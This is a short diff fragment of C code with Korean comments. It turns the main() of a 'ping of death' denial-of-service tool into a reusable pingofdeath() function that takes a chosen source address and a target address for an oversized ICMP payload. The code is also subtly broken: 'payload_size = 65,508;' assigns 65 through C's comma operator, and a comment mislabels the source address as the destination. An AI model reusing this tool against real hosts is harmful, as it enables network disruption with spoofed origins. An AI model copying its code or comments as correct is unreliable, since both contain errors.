@@ -9,15 +9,15 @@
 
 
  unsigned short in_cksum(unsigned short *ptr, int nbytes);
- int main(int argc, char **argv)
+ int pingofdeath(char *csaddr, char *cdaddr)
 {
 	
 	unsigned long daddr; // 목적지 IP 주소를 담을 변수
 	unsigned long saddr; // 도착지 IP 주소를 담을 변수 
 	int payload_size = 0, sent, sent_size;
 	payload_size = 65,508;		// 페이로드 크기는 인터넷 프로토콜 허용 범위가 65,536바이트 
-	saddr = inet_addr(argv[1]); // 문자열 IP 행태를 long 형 IP 로 바꿔줌 
-	daddr = inet_addr(argv[2]); // 문자열 IP 행태를 long 형 IP 로 바꿔줌 
+	saddr = inet_addr(csaddr); // 문자열 IP 행태를 long 형 IP 로 바꿔줌 
+	daddr = inet_addr(cdaddr); // 문자열 IP 행태를 long 형 IP 로 바꿔줌 
 
 	
 
